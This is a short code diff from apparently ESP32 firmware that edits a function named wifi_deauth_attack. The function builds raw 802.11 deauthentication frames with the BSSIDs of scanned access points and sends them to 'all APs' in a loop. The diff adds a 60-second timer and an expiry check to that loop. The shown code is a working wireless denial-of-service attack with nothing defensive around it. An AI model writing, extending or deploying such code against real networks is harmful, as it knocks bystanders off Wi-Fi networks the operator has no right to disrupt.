@@ -209,9 +209,9 @@ void wifi_deauth_attack(void) {
     display_draw_text(10, 10, "Deauth Attack", COLOR_RED, COLOR_BLACK);
     display_fill_rect(0, 25, DISPLAY_WIDTH, 2, COLOR_WHITE);
     display_draw_text(10, 30, "Target all APs", COLOR_WHITE, COLOR_BLACK);
-  // Line 138: Add a duration parameter (e.g., 60 seconds or 0 for unlimited)
-attack_timer_start(0);  // 0 for unlimited, or specify seconds like 60, 120, etc.
-esp_wifi_set_promiscuous(true);
+    
+    attack_timer_start(60);
+    esp_wifi_set_promiscuous(true);
 
 uint8_t deauth_frame[] = {
     0xc0, 0x00, 0x3a, 0x01,
@@ -222,7 +222,7 @@ uint8_t deauth_frame[] = {
 };
 
 int total_packets = 0;
-for (int i = 0; i < 100; i++) {
+for (int i = 0; i < 100 && !attack_timer_expired(); i++) {
     for (int j = 0; j < ap_count && j < 5; j++) {
         memcpy(&deauth_frame[10], ap_records[j].bssid, 6);
         memcpy(&deauth_frame[16], ap_records[j].bssid, 6);
